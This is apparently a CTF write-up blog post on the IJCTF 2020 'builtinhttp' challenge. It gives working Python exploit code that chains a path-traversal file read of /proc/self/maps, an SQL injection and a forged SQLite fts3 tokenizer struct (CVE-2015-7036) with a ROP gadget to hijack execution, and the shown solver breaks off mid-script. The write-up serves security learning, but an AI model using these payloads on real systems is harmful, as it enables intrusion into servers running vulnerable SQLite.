<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width"><title>IJCTF 2020 - builtinhttp | circleous</title><link rel=stylesheet href=/css/main.min.480e0ef6c6aac53eaf38419259058419b9323d67397f61cf2d8ce892d869c560.css integrity="sha256-SA4O9saqxT6vOEGSWQWEGbkyPWc5f2HPLYzokthpxWA=" crossorigin=anonymous><link rel=stylesheet href=/css/codes.min.212a1080bdb9f68724a4aff8ef71b5bf08e662a8f5ef70b13d4d94330d804899.css integrity="sha256-ISoQgL259ockpK/473G1vwjmYqj173CxPU2UMw2ASJk=" crossorigin=anonymous></head><body><header><h1><a href=/>circleous</a></h1><nav><ul><li><a href=/>Home</a></li><li><a aria-current=true class=ancestor href=/posts/>Posts</a></li><li><a href=/tags/>Tags</a></li></ul></nav></header><main><article><header><h1>IJCTF 2020 - builtinhttp</h1><time datetime=2020-04-27T00:00:00+07:00>April 27, 2020</time></header><p>The intended solution was using a buffer overflow on <code>[^fopen_test:%arg_path%^]</code>. I did notice this bug first since I&rsquo;m guessing that the binary should have a buffer overflow because there is no stack canary. The problem is that, I don&rsquo;t know there exist sqlite ATTACH DATABASE which you can use it to write into file system and then use it with fopen_test to pwn. The another bug I found was the sqlite injection and use fts3 module, this is something I didn&rsquo;t want to touch first since I know the fopen_test bug, but since I don&rsquo;t have any option left (It has been 6 hours finding how to write file into system and I still didn&rsquo;t know how to do it), I decided to use fts3 module exploit. Go to author excellent write-up on built_in_http to get the gist of this challenge <a href=https://vuln.live/blog/9>https://vuln.live/blog/9</a>. I&rsquo;ll not discuss deeper on the reversing part, just the basic idea of exploiting sqlite fts3 module and try to add some comments how I solved this challenge.</p><h3 id=cve-2015-7036><strong>CVE-2015-7036</strong></h3><p>This is known bug and has been left unfixed for years. The bug is in fts3_toknizer sql function, see the implementation here<br><a href=https://github.com/sqlite/sqlite/blob/master/ext/fts3/fts3_tokenizer.c#L44-L64>https://github.com/sqlite/sqlite/blob/master/ext/fts3/fts3_tokenizer.c#L44-L64</a><br><code>fts3_tokenizer(&lt;name>, &lt;pointer>)</code>, if <code>&lt;pointer></code> is specified, it&rsquo;ll try to load the blob from specified pointer. The blob is in fact a <code>sqlite3_tokenizer_module</code> struct,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#bb9af7>struct</span> sqlite3_tokenizer_module {
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> iVersion;                  <span style=color:#414868;font-style:italic>/* currently 0 */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>/*
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>  ** Create and destroy a tokenizer.  argc/argv are passed down from
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>  ** the fulltext virtual table creation to allow customization.
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>  */</span>
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> (<span style=color:#9ece6a;font-weight:700>*</span>xCreate)(<span style=color:#41a6b5>int</span> argc, <span style=color:#bb9af7>const</span> <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>**</span>argv,
</span></span><span style=display:flex><span>                 sqlite3_tokenizer <span style=color:#9ece6a;font-weight:700>**</span>ppTokenizer);
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> (<span style=color:#9ece6a;font-weight:700>*</span>xDestroy)(sqlite3_tokenizer <span style=color:#9ece6a;font-weight:700>*</span>pTokenizer);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>/*
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>  ** Tokenize a particular input.  Call xOpen() to prepare to
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>  ** tokenize, xNext() repeatedly until it returns SQLITE_DONE, then
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>  ** xClose() to free any internal state.  The pInput passed to
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>  ** xOpen() must exist until the cursor is closed.  The ppToken
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>  ** result from xNext() is only valid until the next call to xNext()
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>  ** or until xClose() is called.
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>  */</span>
</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>/* TODO(shess) current implementation requires pInput to be
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>  ** nul-terminated.  This should either be fixed, or pInput/nBytes
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>  ** should be converted to zInput.
</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>  */</span>
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> (<span style=color:#9ece6a;font-weight:700>*</span>xOpen)(sqlite3_tokenizer <span style=color:#9ece6a;font-weight:700>*</span>pTokenizer,
</span></span><span style=display:flex><span>               <span style=color:#bb9af7>const</span> <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>pInput, <span style=color:#41a6b5>int</span> nBytes,
</span></span><span style=display:flex><span>               sqlite3_tokenizer_cursor <span style=color:#9ece6a;font-weight:700>**</span>ppCursor);
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> (<span style=color:#9ece6a;font-weight:700>*</span>xClose)(sqlite3_tokenizer_cursor <span style=color:#9ece6a;font-weight:700>*</span>pCursor);
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> (<span style=color:#9ece6a;font-weight:700>*</span>xNext)(sqlite3_tokenizer_cursor <span style=color:#9ece6a;font-weight:700>*</span>pCursor,
</span></span><span style=display:flex><span>               <span style=color:#bb9af7>const</span> <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>**</span>ppToken, <span style=color:#41a6b5>int</span> <span style=color:#9ece6a;font-weight:700>*</span>pnBytes,
</span></span><span style=display:flex><span>               <span style=color:#41a6b5>int</span> <span style=color:#9ece6a;font-weight:700>*</span>piStartOffset, <span style=color:#41a6b5>int</span> <span style=color:#9ece6a;font-weight:700>*</span>piEndOffset, <span style=color:#41a6b5>int</span> <span style=color:#9ece6a;font-weight:700>*</span>piPosition);
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>Since we are dealing with function pointers, getting a code execution from this should be fairly easy. Suppose we have a heap address leak, we could craft a <code>sqlite3_tokenizer_module</code> struct in heap with</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#bb9af7>SELECT</span> <span style=color:#bb9af7>replace</span>(hex(zeroblob(<span style=color:#e0af68>10000</span>)), <span style=color:#9ece6a>&#39;00&#39;</span>, x<span style=color:#9ece6a>&#39;sqlite3_tokenizer_module struct here&#39;</span>);
</span></span></code></pre></div><p>Then load the fts3_tokenizer module from heap with</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>    <span style=color:#bb9af7>SELECT</span> fts3_tokenizer(<span style=color:#9ece6a>&#39;&lt;tokenizer name&gt;&#39;</span>, x<span style=color:#9ece6a>&#39;&lt;crafted sqlite3_tokenizer_module_address&gt;&#39;</span>);
</span></span></code></pre></div><p>Trigger code execution via crafted function pointers from <code>sqlite3_tokenizer_module</code> struct,</p><ul><li><code>xCreate</code> with <code>CREATE VIRTUAL TABLE pwn USING fts3(tokenize=&lt;tokenizer name>);</code></li><li><code>xDestroy</code> with <code>DROP TABLE pwn;</code></li><li><code>xOpen</code> with <code>INSERT INTO pwn VALUES(x'values here');</code></li></ul><h3 id=builtin_><strong>builtin_http</strong></h3><p>To pwn this, first we need a leak. read <code>/proc/self/maps</code> to get heap and lib address leak via LFI in <code>/static/../../../../</code> endpoint.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#7dcfff>from</span> <span style=color:#e0af68>pwn</span> <span style=color:#7dcfff>import</span> <span style=color:#9ece6a;font-weight:700>*</span>
</span></span><span style=display:flex><span>HOST, PORT <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#9ece6a>&#39;34.87.169.10&#39;</span>, <span style=color:#e0af68>31339</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>read_file</span>(path):
</span></span><span style=display:flex><span>    r <span style=color:#9ece6a;font-weight:700>=</span> remote(HOST, PORT)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>send(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;GET /static/../../../../../../../../../../../../..%b HTTP/1.1</span><span style=color:#7aa2f7>\r\n\r\n</span><span style=color:#9ece6a>&#39;</span> <span style=color:#9ece6a;font-weight:700>%</span> path)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>recvuntil(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;text/html</span><span style=color:#7aa2f7>\n\n</span><span style=color:#9ece6a>&#39;</span>)
</span></span><span style=display:flex><span>    res <span style=color:#9ece6a;font-weight:700>=</span> r<span style=color:#9ece6a;font-weight:700>.</span>recvall()
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>close()
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> res
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>heap_base <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>
</span></span><span style=display:flex><span>sqlbase <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>read_map</span>():
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>global</span> heap_base, sqlbase
</span></span><span style=display:flex><span>    maps <span style=color:#9ece6a;font-weight:700>=</span> read_file(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;/proc/self/maps&#39;</span>)[:<span style=color:#9ece6a;font-weight:700>-</span><span style=color:#e0af68>1</span>]
</span></span><span style=display:flex><span>    maps <span style=color:#9ece6a;font-weight:700>=</span> maps<span style=color:#9ece6a;font-weight:700>.</span>split(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>for</span> line <span style=color:#9ece6a;font-weight:700>in</span> maps:
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>if</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;[heap]&#39;</span> <span style=color:#9ece6a;font-weight:700>in</span> line:
</span></span><span style=display:flex><span>            heap_base <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>int</span>(line<span style=color:#9ece6a;font-weight:700>.</span>split(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;-&#39;</span>)[<span style=color:#e0af68>0</span>], <span style=color:#e0af68>16</span>)
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>elif</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;libsqlite3&#39;</span> <span style=color:#9ece6a;font-weight:700>in</span> line:
</span></span><span style=display:flex><span>            sqlbase <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>int</span>(line<span style=color:#9ece6a;font-weight:700>.</span>split(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;-&#39;</span>)[<span style=color:#e0af68>0</span>], <span style=color:#e0af68>16</span>)
</span></span><span style=display:flex><span>            <span style=color:#bb9af7>break</span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>exploit</span>():
</span></span><span style=display:flex><span>    read_map()
</span></span><span style=display:flex><span>    <span style=color:#9ece6a>print</span>(<span style=color:#9ece6a>&#34;[!] heap </span><span style=color:#9ece6a>%x</span><span style=color:#9ece6a>&#34;</span> <span style=color:#9ece6a;font-weight:700>%</span> heap_base)
</span></span><span style=display:flex><span>    <span style=color:#9ece6a>print</span>(<span style=color:#9ece6a>&#34;[!] libsqlite3.so </span><span style=color:#9ece6a>%x</span><span style=color:#9ece6a>&#34;</span> <span style=color:#9ece6a;font-weight:700>%</span> sqlbase)
</span></span></code></pre></div><p>The next part is to craft <code>sqlite3_tokenizer_module</code>, to do this we can use built in <a href=https://github.com/sqlite/sqlite/blob/master/ext/fts1/simple_tokenizer.c#L161-L168><code>simple</code> fts module</a>,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#bb9af7>static</span> sqlite3_tokenizer_module simpleTokenizerModule <span style=color:#9ece6a;font-weight:700>=</span> {
</span></span><span style=display:flex><span>  <span style=color:#e0af68>0</span>,
</span></span><span style=display:flex><span>  simpleCreate,
</span></span><span style=display:flex><span>  simpleDestroy,
</span></span><span style=display:flex><span>  simpleOpen,
</span></span><span style=display:flex><span>  simpleClose,
</span></span><span style=display:flex><span>  simpleNext,
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>server <span style=color:#9ece6a;font-weight:700>=</span> ELF(<span style=color:#9ece6a>&#39;./server&#39;</span>, <span style=color:#e0af68>0</span>)
</span></span><span style=display:flex><span>system <span style=color:#9ece6a;font-weight:700>=</span> server<span style=color:#9ece6a;font-weight:700>.</span>plt[<span style=color:#9ece6a>&#39;system&#39;</span>]
</span></span><span style=display:flex><span>simple_create <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x2abd0</span>
</span></span><span style=display:flex><span>simple_destroy <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x23c40</span>
</span></span><span style=display:flex><span>simple_open <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x2ab40</span>
</span></span><span style=display:flex><span>simple_close <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x19080</span>
</span></span><span style=display:flex><span>simple_next <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x2cb50</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>admin</span>(var, key<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;20c366aada34781158ae700cec09a4ce&#39;</span>):
</span></span><span style=display:flex><span>    r <span style=color:#9ece6a;font-weight:700>=</span> remote(HOST, PORT)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>send(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;GET /admin?key=%b&amp;var=%b HTTP/1.1</span><span style=color:#7aa2f7>\r\n\r\n</span><span style=color:#9ece6a>&#39;</span> <span style=color:#9ece6a;font-weight:700>%</span> (key, var))
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>fire</span>(heap_base, sqlbase, offset<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>0</span>):
</span></span><span style=display:flex><span>    fts_module_struct_addr <span style=color:#9ece6a;font-weight:700>=</span> heap_base <span style=color:#9ece6a;font-weight:700>+</span> offset
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    fts_module_struct  <span style=color:#9ece6a;font-weight:700>=</span> p64(<span style=color:#e0af68>0</span>) <span style=color:#414868;font-style:italic># version</span>
</span></span><span style=display:flex><span>    fts_module_struct <span style=color:#9ece6a;font-weight:700>+=</span> p64(sqlbase <span style=color:#9ece6a;font-weight:700>+</span> simple_create) <span style=color:#414868;font-style:italic># xCreate</span>
</span></span><span style=display:flex><span>    fts_module_struct <span style=color:#9ece6a;font-weight:700>+=</span> p64(sqlbase <span style=color:#9ece6a;font-weight:700>+</span> simple_destroy) <span style=color:#414868;font-style:italic># xDestroy</span>
</span></span><span style=display:flex><span>    fts_module_struct <span style=color:#9ece6a;font-weight:700>+=</span> p64(sqlbase <span style=color:#9ece6a;font-weight:700>+</span> simple_open) <span style=color:#414868;font-style:italic># xOpen</span>
</span></span><span style=display:flex><span>    fts_module_struct <span style=color:#9ece6a;font-weight:700>+=</span> p64(sqlbase <span style=color:#9ece6a;font-weight:700>+</span> simple_close) <span style=color:#414868;font-style:italic># xClose</span>
</span></span><span style=display:flex><span>    fts_module_struct <span style=color:#9ece6a;font-weight:700>+=</span> p64(sqlbase <span style=color:#9ece6a;font-weight:700>+</span> simple_next) <span style=color:#414868;font-style:italic># xNext</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    payload  <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;asd&#39;;&#34;</span>
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;select replace(hex(zeroblob(10000)), &#39;00&#39;, x&#39;4242424242424242%b4343434343434343&#39;);&#34;</span> <span style=color:#9ece6a;font-weight:700>%</span> (hexlify(fts_module_struct))
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;select fts3_tokenizer(&#39;exploit&#39;, x&#39;%b&#39;);&#34;</span> <span style=color:#9ece6a;font-weight:700>%</span> hexlify(p64(fts_module_struct_addr))
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;create virtual table pwn using fts3(tokenize=&#39;exploit&#39;);&#34;</span>
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;-- &#34;</span>
</span></span><span style=display:flex><span>    admin(payload<span style=color:#9ece6a;font-weight:700>.</span>replace(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34; &#34;</span>, <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;/**/&#34;</span>))
</span></span></code></pre></div><p>override one of function pointers to get a code execution, a screenshot when I override <code>xCreate</code></p><p><img src=https://a.pomf.cat/bgnhnh.png alt=https://a.pomf.cat/bgnhnh.png></p><p><img src=https://a.pomf.cat/igihno.png alt=https://a.pomf.cat/igihno.png></p><p>This is actually great, <code>rax</code> holds pointer to our crafted <code>sqlite3_tokenizer_module</code> , since we can get a hold of whats inside <code>rax</code>, we just need to find a reliable gadget</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>λ › ropper --file ./libsqlite3.so.0.8.6 --search <span style=color:#9ece6a>&#39;mov ???, [rax]&#39;</span> | grep call
</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>INFO<span style=color:#9ece6a;font-weight:700>]</span> Load gadgets from cache
</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>LOAD<span style=color:#9ece6a;font-weight:700>]</span> loading... 100%
</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>LOAD<span style=color:#9ece6a;font-weight:700>]</span> removing double gadgets... 100%
</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>INFO<span style=color:#9ece6a;font-weight:700>]</span> Searching <span style=color:#bb9af7>for</span> gadgets: mov ???, <span style=color:#9ece6a;font-weight:700>[</span>rax<span style=color:#9ece6a;font-weight:700>]</span>
</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>INFO<span style=color:#9ece6a;font-weight:700>]</span> File: ./libsqlite3.so.0.8.6
</span></span><span style=display:flex><span>0x0000000000078fd2: mov eax, dword ptr <span style=color:#9ece6a;font-weight:700>[</span>rax<span style=color:#9ece6a;font-weight:700>]</span>; call qword ptr <span style=color:#9ece6a;font-weight:700>[</span>rax + 0x28<span style=color:#9ece6a;font-weight:700>]</span>;
</span></span><span style=display:flex><span>0x000000000008d367: mov eax, dword ptr <span style=color:#9ece6a;font-weight:700>[</span>rax<span style=color:#9ece6a;font-weight:700>]</span>; mov rdi, rax; call qword ptr <span style=color:#9ece6a;font-weight:700>[</span>rax + 0x38<span style=color:#9ece6a;font-weight:700>]</span>;
</span></span><span style=display:flex><span>0x0000000000078fd1: mov rax, qword ptr <span style=color:#9ece6a;font-weight:700>[</span>rax<span style=color:#9ece6a;font-weight:700>]</span>; call qword ptr <span style=color:#9ece6a;font-weight:700>[</span>rax + 0x28<span style=color:#9ece6a;font-weight:700>]</span>;
</span></span><span style=display:flex><span>0x000000000008d366: mov rax, qword ptr <span style=color:#9ece6a;font-weight:700>[</span>rax<span style=color:#9ece6a;font-weight:700>]</span>; mov rdi, rax; call qword ptr <span style=color:#9ece6a;font-weight:700>[</span>rax + 0x38<span style=color:#9ece6a;font-weight:700>]</span>;
</span></span></code></pre></div><p>Luckily, the latest version of libsqlite3 in Ubuntu 16.04.6 has this nice gadget we can use. We can both control next call (<code>[[rax] + 0x38]</code>) and the first parameter with <code>rdi</code>. <code>0x000000000008d366: mov rax, qword ptr [rax]; mov rdi, rax; call qword ptr [rax + 0x38];</code><br>The final step is just to override xCreate with the gadget and include our shell payload. Full solver,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#7dcfff>from</span> <span style=color:#e0af68>pwn</span> <span style=color:#7dcfff>import</span> <span style=color:#9ece6a;font-weight:700>*</span>
</span></span><span style=display:flex><span><span style=color:#7dcfff>from</span> <span style=color:#e0af68>binascii</span> <span style=color:#7dcfff>import</span> hexlify
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># HOST, PORT = (&#39;34.87.169.10&#39;, 31339)</span>
</span></span><span style=display:flex><span>HOST, PORT <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#9ece6a>&#39;127.0.0.1&#39;</span>, <span style=color:#e0af68>3000</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>read_file</span>(path):
</span></span><span style=display:flex><span>    r <span style=color:#9ece6a;font-weight:700>=</span> remote(HOST, PORT)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>send(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;GET /static/../../../../../../../../../../../../..%b HTTP/1.1</span><span style=color:#7aa2f7>\r\n\r\n</span><span style=color:#9ece6a>&#39;</span> <span style=color:#9ece6a;font-weight:700>%</span> path)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>recvuntil(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;text/html</span><span style=color:#7aa2f7>\n\n</span><span style=color:#9ece6a>&#39;</span>)
</span></span><span style=display:flex><span>    res <span style=color:#9ece6a;font-weight:700>=</span> r<span style=color:#9ece6a;font-weight:700>.</span>recvall()
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>close()
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> res
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>admin</span>(var, key<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;20c366aada34781158ae700cec09a4ce&#39;</span>):
</span></span><span style=display:flex><span>    r <span style=color:#9ece6a;font-weight:700>=</span> remote(HOST, PORT)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>send(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;GET /admin?key=%b&amp;var=%b HTTP/1.1</span><span style=color:#7aa2f7>\r\n\r\n</span><span style=color:#9ece6a>&#39;</span> <span style=color:#9ece6a;font-weight:700>%</span> (key, var))
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>read_map</span>():
</span></span><span style=display:flex><span>    maps <span style=color:#9ece6a;font-weight:700>=</span> read_file(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;/proc/self/maps&#39;</span>)[:<span style=color:#9ece6a;font-weight:700>-</span><span style=color:#e0af68>1</span>]
</span></span><span style=display:flex><span>    maps <span style=color:#9ece6a;font-weight:700>=</span> maps<span style=color:#9ece6a;font-weight:700>.</span>split(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>for</span> line <span style=color:#9ece6a;font-weight:700>in</span> maps:
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>if</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;[heap]&#39;</span> <span style=color:#9ece6a;font-weight:700>in</span> line:
</span></span><span style=display:flex><span>            heap_base <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>int</span>(line<span style=color:#9ece6a;font-weight:700>.</span>split(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;-&#39;</span>)[<span style=color:#e0af68>0</span>], <span style=color:#e0af68>16</span>)
</span></span><span style=display:flex><span>            <span style=color:#bb9af7>elif</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;libsqlite3&#39;</span> <span style=color:#9ece6a;font-weight:700>in</span> line:
</span></span><span style=display:flex><span>            sqlbase <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>int</span>(line<span style=color:#9ece6a;font-weight:700>.</span>split(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;-&#39;</span>)[<span style=color:#e0af68>0</span>], <span style=color:#e0af68>16</span>)
</span></span><span style=display:flex><span>            <span style=color:#bb9af7>break</span>
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> heap_base, sqlbase
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>server <span style=color:#9ece6a;font-weight:700>=</span> ELF(<span style=color:#9ece6a>&#39;./server&#39;</span>, <span style=color:#e0af68>0</span>)
</span></span><span style=display:flex><span>system <span style=color:#9ece6a;font-weight:700>=</span> server<span style=color:#9ece6a;font-weight:700>.</span>plt[<span style=color:#9ece6a>&#39;system&#39;</span>]
</span></span><span style=display:flex><span>simple_create <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x2abd0</span>
</span></span><span style=display:flex><span>simple_destroy <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x23c40</span>
</span></span><span style=display:flex><span>simple_open <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x2ab40</span>
</span></span><span style=display:flex><span>simple_close <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x19080</span>
</span></span><span style=display:flex><span>simple_next <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x2cb50</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>fire</span>(heap_base, sqlbase, offset<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>0x45190</span>):
</span></span><span style=display:flex><span>    fts_module_struct_addr <span style=color:#9ece6a;font-weight:700>=</span> heap_base <span style=color:#9ece6a;font-weight:700>+</span> offset
</span></span><span style=display:flex><span>    shell_addr <span style=color:#9ece6a;font-weight:700>=</span> fts_module_struct_addr <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>0x38</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    fts_module_struct  <span style=color:#9ece6a;font-weight:700>=</span> p64(shell_addr) <span style=color:#414868;font-style:italic># version</span>
</span></span><span style=display:flex><span>    fts_module_struct <span style=color:#9ece6a;font-weight:700>+=</span> p64(sqlbase <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>0x000000000008d366</span>) <span style=color:#414868;font-style:italic># xCreate</span>
</span></span><span style=display:flex><span>    fts_module_struct <span style=color:#9ece6a;font-weight:700>+=</span> p64(sqlbase <span style=color:#9ece6a;font-weight:700>+</span> simple_destroy) <span style=color:#414868;font-style:italic># xDestroy</span>
</span></span><span style=display:flex><span>    fts_module_struct <span style=color:#9ece6a;font-weight:700>+=</span> p64(sqlbase <span style=color:#9ece6a;font-weight:700>+</span> simple_open) <span style=color:#414868;font-style:italic># xOpen</span>
